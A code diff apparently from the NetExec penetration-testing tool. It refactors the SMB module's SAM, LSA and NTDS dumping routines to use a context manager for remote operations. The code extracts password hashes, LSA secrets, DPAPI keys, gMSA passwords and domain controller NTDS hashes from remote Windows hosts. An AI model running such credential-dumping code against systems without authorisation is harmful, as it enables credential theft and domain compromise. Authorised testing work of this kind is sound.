@@ -2282,55 +2282,51 @@ class smb(connection):
     def sam(self):
         try:
             self.enable_remoteops(regsecret=(self.args.sam == "regdump"))
-            host_id = self.db.get_hosts(filter_term=self.host)[0][0]
+            with self.remote_ops:
+                host_id = self.db.get_hosts(filter_term=self.host)[0][0]
 
-            def add_sam_hash(sam_hash, host_id):
-                self.logger.highlight(sam_hash)
-                if "_history" in sam_hash:
-                    return
-                username, _, lmhash, nthash, _, _, _ = sam_hash.split(":")
-                self.db.add_credential(
-                    "hash",
-                    self.hostname,
-                    username,
-                    f"{lmhash}:{nthash}",
-                    pillaged_from=host_id,
-                )
-                add_sam_hash.sam_hashes += 1
-
-            add_sam_hash.sam_hashes = 0
-
-            if self.remote_ops and self.bootkey:
-                if self.args.sam == "regdump":
-                    SAM = RegSecretsSAMHashes(
-                        self.bootkey,
-                        remoteOps=self.remote_ops,
-                        perSecretCallback=lambda secret: add_sam_hash(secret, host_id),
-                        history=self.args.history,
+                def add_sam_hash(sam_hash, host_id):
+                    self.logger.highlight(sam_hash)
+                    if "_history" in sam_hash:
+                        return
+                    username, _, lmhash, nthash, _, _, _ = sam_hash.split(":")
+                    self.db.add_credential(
+                        "hash",
+                        self.hostname,
+                        username,
+                        f"{lmhash}:{nthash}",
+                        pillaged_from=host_id,
                     )
-                else:
-                    SAM_file_name = self.remote_ops.saveSAM()
-                    SAM = SAMHashes(
-                        SAM_file_name,
-                        self.bootkey,
-                        isRemote=True,
-                        history=self.args.history,
-                        perSecretCallback=lambda secret: add_sam_hash(secret, host_id),
-                    )
+                    add_sam_hash.sam_hashes += 1
 
-                self.logger.display("Dumping SAM hashes")
-                self.output_filename = self.output_file_template.format(output_folder="sam")
-                SAM.dump()
-                SAM.export(self.output_filename)
-                self.logger.success(f"Added {highlight(add_sam_hash.sam_hashes)} SAM hashes to the database")
+                add_sam_hash.sam_hashes = 0
 
-                try:
-                    self.remote_ops.finish()
-                except Exception as e:
-                    self.logger.debug(f"Error calling remote_ops.finish(): {e}")
+                if self.remote_ops and self.bootkey:
+                    if self.args.sam == "regdump":
+                        SAM = RegSecretsSAMHashes(
+                            self.bootkey,
+                            remoteOps=self.remote_ops,
+                            perSecretCallback=lambda secret: add_sam_hash(secret, host_id),
+                            history=self.args.history,
+                        )
+                    else:
+                        SAM_file_name = self.remote_ops.saveSAM()
+                        SAM = SAMHashes(
+                            SAM_file_name,
+                            self.bootkey,
+                            isRemote=True,
+                            history=self.args.history,
+                            perSecretCallback=lambda secret: add_sam_hash(secret, host_id),
+                        )
 
-                if self.args.sam == "secdump":
-                    SAM.finish()
+                    self.logger.display("Dumping SAM hashes")
+                    self.output_filename = self.output_file_template.format(output_folder="sam")
+                    SAM.dump()
+                    SAM.export(self.output_filename)
+                    self.logger.success(f"Added {highlight(add_sam_hash.sam_hashes)} SAM hashes to the database")
+
+                    if self.args.sam == "secdump":
+                        SAM.finish()
         except SessionError as e:
             if "STATUS_ACCESS_DENIED" in e.getErrorString():
                 self.logger.fail('Error "STATUS_ACCESS_DENIED" while dumping SAM. This is likely due to an endpoint protection.')
@@ -2385,63 +2381,59 @@ class smb(connection):
         try:
             # --dpapi calls lsa() without --lsa, so it gets the default regdump mode too
             self.enable_remoteops(regsecret=(self.args.lsa != "secdump"))
+            with self.remote_ops:
+                def add_lsa_secret(secret):
+                    add_lsa_secret.secrets += 1
+                    if "dpapi_machinekey" not in secret:
+                        if not quiet:
+                            self.logger.highlight(secret)
+                    else:
+                        correl_table = {"dpapi_machinekey": "MachineKey", "dpapi_userkey": "UserKey"}
+                        self.dpapi_system_key = {correl_table[k]: binascii.unhexlify(v[2:]) for k, v in (elem.split(":") for elem in secret.splitlines())}
+                        if not quiet:
+                            self.logger.highlight(f"dpapi_machinekey:{self.dpapi_system_key['MachineKey'].hex()}")
+                            self.logger.highlight(f"dpapi_userkey:{self.dpapi_system_key['UserKey'].hex()}")
+                    if "_SC_GMSA_{84A78B8C" in secret:
+                        gmsa_id = secret.split("_")[4].split(":")[0]
+                        data = bytes.fromhex(secret.split("_")[4].split(":")[1])
+                        blob = MSDS_MANAGEDPASSWORD_BLOB()
+                        blob.fromString(data)
+                        currentPassword = blob["CurrentPassword"][:-2]
+                        ntlm_hash = MD4.new()
+                        ntlm_hash.update(currentPassword)
+                        passwd = binascii.hexlify(ntlm_hash.digest()).decode("utf-8")
+                        if not quiet:
+                            self.logger.highlight(f"GMSA ID: {gmsa_id:<20} NTLM: {passwd}")
 
-            def add_lsa_secret(secret):
-                add_lsa_secret.secrets += 1
-                if "dpapi_machinekey" not in secret:
-                    if not quiet:
-                        self.logger.highlight(secret)
-                else:
-                    correl_table = {"dpapi_machinekey": "MachineKey", "dpapi_userkey": "UserKey"}
-                    self.dpapi_system_key = {correl_table[k]: binascii.unhexlify(v[2:]) for k, v in (elem.split(":") for elem in secret.splitlines())}
-                    if not quiet:
-                        self.logger.highlight(f"dpapi_machinekey:{self.dpapi_system_key['MachineKey'].hex()}")
-                        self.logger.highlight(f"dpapi_userkey:{self.dpapi_system_key['UserKey'].hex()}")
-                if "_SC_GMSA_{84A78B8C" in secret:
-                    gmsa_id = secret.split("_")[4].split(":")[0]
-                    data = bytes.fromhex(secret.split("_")[4].split(":")[1])
-                    blob = MSDS_MANAGEDPASSWORD_BLOB()
-                    blob.fromString(data)
-                    currentPassword = blob["CurrentPassword"][:-2]
-                    ntlm_hash = MD4.new()
-                    ntlm_hash.update(currentPassword)
-                    passwd = binascii.hexlify(ntlm_hash.digest()).decode("utf-8")
-                    if not quiet:
-                        self.logger.highlight(f"GMSA ID: {gmsa_id:<20} NTLM: {passwd}")
+                add_lsa_secret.secrets = 0
 
-            add_lsa_secret.secrets = 0
-
-            if self.remote_ops and self.bootkey:
-                if self.args.lsa != "secdump":
-                    LSA = RegSecretsLSASecrets(
-                        self.bootkey,
-                        self.remote_ops,
-                        perSecretCallback=lambda secret_type, secret: add_lsa_secret(secret),
-                    )
-                else:
-                    SECURITYFileName = self.remote_ops.saveSECURITY()
-                    LSA = LSASecrets(
-                        SECURITYFileName,
-                        self.bootkey,
-                        self.remote_ops,
-                        isRemote=True,
-                        perSecretCallback=lambda secret_type, secret: add_lsa_secret(secret),
-                    )
-                if not quiet:
-                    self.logger.display("Dumping LSA secrets")
-                self.output_filename = self.output_file_template.format(output_folder="lsa")
-                LSA.dumpCachedHashes()
-                LSA.exportCached(self.output_filename)
-                LSA.dumpSecrets()
-                LSA.exportSecrets(self.output_filename)
-                if not quiet:
-                    self.logger.success(f"Dumped {highlight(add_lsa_secret.secrets)} LSA secrets to {self.output_filename + '.secrets'} and {self.output_filename + '.cached'}")
-                try:
-                    self.remote_ops.finish()
-                except Exception as e:
-                    self.logger.debug(f"Error calling remote_ops.finish(): {e}")
-                if self.args.lsa == "secdump":
-                    LSA.finish()
+                if self.remote_ops and self.bootkey:
+                    if self.args.lsa != "secdump":
+                        LSA = RegSecretsLSASecrets(
+                            self.bootkey,
+                            self.remote_ops,
+                            perSecretCallback=lambda secret_type, secret: add_lsa_secret(secret),
+                        )
+                    else:
+                        SECURITYFileName = self.remote_ops.saveSECURITY()
+                        LSA = LSASecrets(
+                            SECURITYFileName,
+                            self.bootkey,
+                            self.remote_ops,
+                            isRemote=True,
+                            perSecretCallback=lambda secret_type, secret: add_lsa_secret(secret),
+                        )
+                    if not quiet:
+                        self.logger.display("Dumping LSA secrets")
+                    self.output_filename = self.output_file_template.format(output_folder="lsa")
+                    LSA.dumpCachedHashes()
+                    LSA.exportCached(self.output_filename)
+                    LSA.dumpSecrets()
+                    LSA.exportSecrets(self.output_filename)
+                    if not quiet:
+                        self.logger.success(f"Dumped {highlight(add_lsa_secret.secrets)} LSA secrets to {self.output_filename + '.secrets'} and {self.output_filename + '.cached'}")
+                    if self.args.lsa == "secdump":
+                        LSA.finish()
         except SessionError as e:
             if "STATUS_ACCESS_DENIED" in e.getErrorString():
                 self.logger.fail('Error "STATUS_ACCESS_DENIED" while dumping LSA. This is likely due to an endpoint protection.')
@@ -2450,118 +2442,115 @@ class smb(connection):
 
     def ntds(self):
         self.enable_remoteops()
-        is_remote = True
-        use_vss_method = False
-        NTDSFileName = None
-        host_id = self.db.get_hosts(filter_term=self.host)[0][0]
-        printed_kerb_keys_banner = False
-        printed_trust_keys_banner = False
+        with self.remote_ops:
+            is_remote = True
+            use_vss_method = False
+            NTDSFileName = None
+            host_id = self.db.get_hosts(filter_term=self.host)[0][0]
+            printed_kerb_keys_banner = False
+            printed_trust_keys_banner = False
 
-        def add_hash(secret_type, secret, host_id):
-            nonlocal printed_kerb_keys_banner, printed_trust_keys_banner
-            if self.args.kerberos_keys and not printed_kerb_keys_banner and secret_type == NTDSHashes.SECRET_TYPE.NTDS_KERBEROS:
-                self.logger.display("Kerberos keys:")
-                printed_kerb_keys_banner = True
+            def add_hash(secret_type, secret, host_id):
+                nonlocal printed_kerb_keys_banner, printed_trust_keys_banner
+                if self.args.kerberos_keys and not printed_kerb_keys_banner and secret_type == NTDSHashes.SECRET_TYPE.NTDS_KERBEROS:
+                    self.logger.display("Kerberos keys:")
+                    printed_kerb_keys_banner = True
 
-            # Count the type of secrets
-            if secret_type == NTDSHashes.SECRET_TYPE.NTDS_KERBEROS:
-                add_hash.kerb_secrets += 1
-            else:
-                add_hash.nt_lm_secrets += 1
-
-            is_enabled_account = secret.endswith(" (status=Enabled)")
-            is_trust_key = " (Incoming" in secret or " (Outgoing" in secret
-            for status in (" (status=Enabled)", " (status=Disabled)", " (status=N/A)"):
-                secret = secret.removesuffix(status)
-
-            if not self.args.enabled or is_enabled_account or is_trust_key:
-                if is_trust_key and not printed_trust_keys_banner:
-                    self.logger.display("Trust keys:")
-                    printed_trust_keys_banner = True
-                self.logger.highlight(secret)
-
-            # Filter out computer accounts, history hashes and kerberos keys for adding to db
-            if secret.find("$") == -1 and secret_type == NTDSHashes.SECRET_TYPE.NTDS and "_history" not in secret:
-                if secret.find("\\") != -1:
-                    domain, clean_hash = secret.split("\\")
+                # Count the type of secrets
+                if secret_type == NTDSHashes.SECRET_TYPE.NTDS_KERBEROS:
+                    add_hash.kerb_secrets += 1
                 else:
-                    domain = self.domain
-                    clean_hash = secret
+                    add_hash.nt_lm_secrets += 1
 
-                try:
-                    username, _, lmhash, nthash, _, _, _ = clean_hash.split(":")
-                    parsed_hash = f"{lmhash}:{nthash}"
-                    if validate_ntlm(parsed_hash):
-                        self.db.add_credential("hash", domain, username, parsed_hash, pillaged_from=host_id)
-                        add_hash.added_to_db += 1
-                        return
-                    raise
-                except Exception:
-                    self.logger.debug("Dumped hash is not NTLM, not adding to db for now ;)")
-            else:
-                self.logger.debug("Dumped hash is a computer account, not adding to db")
+                is_enabled_account = secret.endswith(" (status=Enabled)")
+                is_trust_key = " (Incoming" in secret or " (Outgoing" in secret
+                for status in (" (status=Enabled)", " (status=Disabled)", " (status=N/A)"):
+                    secret = secret.removesuffix(status)
 
-        add_hash.nt_lm_secrets = 0
-        add_hash.kerb_secrets = 0
-        add_hash.added_to_db = 0
+                if not self.args.enabled or is_enabled_account or is_trust_key:
+                    if is_trust_key and not printed_trust_keys_banner:
+                        self.logger.display("Trust keys:")
+                        printed_trust_keys_banner = True
+                    self.logger.highlight(secret)
 
-        if self.args.ntds == "vss":
-            use_vss_method = True
-            is_remote = False
-            output_folder = os.path.abspath(os.path.join(NXC_PATH, "logs", "ntds", sanitize_path_component(self.hostname)))
-            os.makedirs(output_folder, exist_ok=True)
-            sam_path, system_path, security_path, NTDSFileName = self.remote_ops.createSSandDownloadWMI("C:\\", output_folder, NTDS=True)
-            localOps = LocalOperations(system_path)
-            self.bootkey = localOps.getBootKey()
+                # Filter out computer accounts, history hashes and kerberos keys for adding to db
+                if secret.find("$") == -1 and secret_type == NTDSHashes.SECRET_TYPE.NTDS and "_history" not in secret:
+                    if secret.find("\\") != -1:
+                        domain, clean_hash = secret.split("\\")
+                    else:
+                        domain = self.domain
+                        clean_hash = secret
 
-        self.output_filename = self.output_file_template.format(output_folder="ntds")
+                    try:
+                        username, _, lmhash, nthash, _, _, _ = clean_hash.split(":")
+                        parsed_hash = f"{lmhash}:{nthash}"
+                        if validate_ntlm(parsed_hash):
+                            self.db.add_credential("hash", domain, username, parsed_hash, pillaged_from=host_id)
+                            add_hash.added_to_db += 1
+                            return
+                        raise
+                    except Exception:
+                        self.logger.debug("Dumped hash is not NTLM, not adding to db for now ;)")
+                else:
+                    self.logger.debug("Dumped hash is a computer account, not adding to db")
 
-        NTDS = NTDSHashes(
-            NTDSFileName,
-            self.bootkey,
-            isRemote=is_remote,
-            history=self.args.history,
-            noLMHash=True,
-            remoteOps=self.remote_ops,
-            useVSSMethod=use_vss_method,
-            justNTLM=not self.args.kerberos_keys,
-            pwdLastSet=False,
-            resumeSession=None,
-            outputFileName=self.output_filename,
-            justUser=self.args.userntds if self.args.userntds else None,
-            printUserStatus=True,
-            trustKeys=self.args.trust_keys,
-            justTrustKeys=self.args.just_trust_keys,
-            domainFQDN=self.targetDomain,
-            perSecretCallback=lambda secret_type, secret: add_hash(secret_type, secret, host_id),
-        )
+            add_hash.nt_lm_secrets = 0
+            add_hash.kerb_secrets = 0
+            add_hash.added_to_db = 0
 
-        try:
-            if self.args.just_trust_keys:
-                self.logger.success("Dumping the trust keys, this could take a while so go grab a redbull...")
-            else:
-                self.logger.success("Dumping the NTDS, this could take a while so go grab a redbull...")
-            NTDS.dump()
-            ntds_outfile = f"{self.output_filename}.ntds"
-            if self.args.just_trust_keys:
-                self.logger.success(f"Dumped {highlight(add_hash.nt_lm_secrets)} trust keys to {ntds_outfile}.trustkeys")
-            else:
-                self.logger.success(f"Dumped {highlight(add_hash.nt_lm_secrets)} NTDS hashes to {ntds_outfile} of which {highlight(add_hash.added_to_db)} were added to the database")
-                if self.args.kerberos_keys:
-                    self.logger.success(f"Dumped {highlight(add_hash.kerb_secrets)} Kerberos keys to {ntds_outfile}.kerberos")
-                self.logger.display("To extract only enabled accounts from the output file, run the following command: ")
-                self.logger.display(f"grep -iv disabled {ntds_outfile} | cut -d ':' -f1")
-        except Exception as e:
-            # if str(e).find('ERROR_DS_DRA_BAD_DN') >= 0:
-            # We don't store the resume file if this error happened, since this error is related to lack
-            # of enough privileges to access DRSUAPI.
-            #    if resumeFile is not None:
-            self.logger.fail(e)
-        try:
-            self.remote_ops.finish()
-        except Exception as e:
-            self.logger.debug(f"Error calling remote_ops.finish(): {e}")
-        NTDS.finish()
+            if self.args.ntds == "vss":
+                use_vss_method = True
+                is_remote = False
+                output_folder = os.path.abspath(os.path.join(NXC_PATH, "logs", "ntds", sanitize_path_component(self.hostname)))
+                os.makedirs(output_folder, exist_ok=True)
+                sam_path, system_path, security_path, NTDSFileName = self.remote_ops.createSSandDownloadWMI("C:\\", output_folder, NTDS=True)
+                localOps = LocalOperations(system_path)
+                self.bootkey = localOps.getBootKey()
+
+            self.output_filename = self.output_file_template.format(output_folder="ntds")
+
+            NTDS = NTDSHashes(
+                NTDSFileName,
+                self.bootkey,
+                isRemote=is_remote,
+                history=self.args.history,
+                noLMHash=True,
+                remoteOps=self.remote_ops,
+                useVSSMethod=use_vss_method,
+                justNTLM=not self.args.kerberos_keys,
+                pwdLastSet=False,
+                resumeSession=None,
+                outputFileName=self.output_filename,
+                justUser=self.args.userntds if self.args.userntds else None,
+                printUserStatus=True,
+                trustKeys=self.args.trust_keys,
+                justTrustKeys=self.args.just_trust_keys,
+                domainFQDN=self.targetDomain,
+                perSecretCallback=lambda secret_type, secret: add_hash(secret_type, secret, host_id),
+            )
+
+            try:
+                if self.args.just_trust_keys:
+                    self.logger.success("Dumping the trust keys, this could take a while so go grab a redbull...")
+                else:
+                    self.logger.success("Dumping the NTDS, this could take a while so go grab a redbull...")
+                NTDS.dump()
+                ntds_outfile = f"{self.output_filename}.ntds"
+                if self.args.just_trust_keys:
+                    self.logger.success(f"Dumped {highlight(add_hash.nt_lm_secrets)} trust keys to {ntds_outfile}.trustkeys")
+                else:
+                    self.logger.success(f"Dumped {highlight(add_hash.nt_lm_secrets)} NTDS hashes to {ntds_outfile} of which {highlight(add_hash.added_to_db)} were added to the database")
+                    if self.args.kerberos_keys:
+                        self.logger.success(f"Dumped {highlight(add_hash.kerb_secrets)} Kerberos keys to {ntds_outfile}.kerberos")
+                    self.logger.display("To extract only enabled accounts from the output file, run the following command: ")
+                    self.logger.display(f"grep -iv disabled {ntds_outfile} | cut -d ':' -f1")
+            except Exception as e:
+                # if str(e).find('ERROR_DS_DRA_BAD_DN') >= 0:
+                # We don't store the resume file if this error happened, since this error is related to lack
+                # of enough privileges to access DRSUAPI.
+                #    if resumeFile is not None:
+                self.logger.fail(e)
+            NTDS.finish()
 
     def mark_guest(self):
         return highlight(f"{highlight('(Guest)')}" if self.is_guest else "")
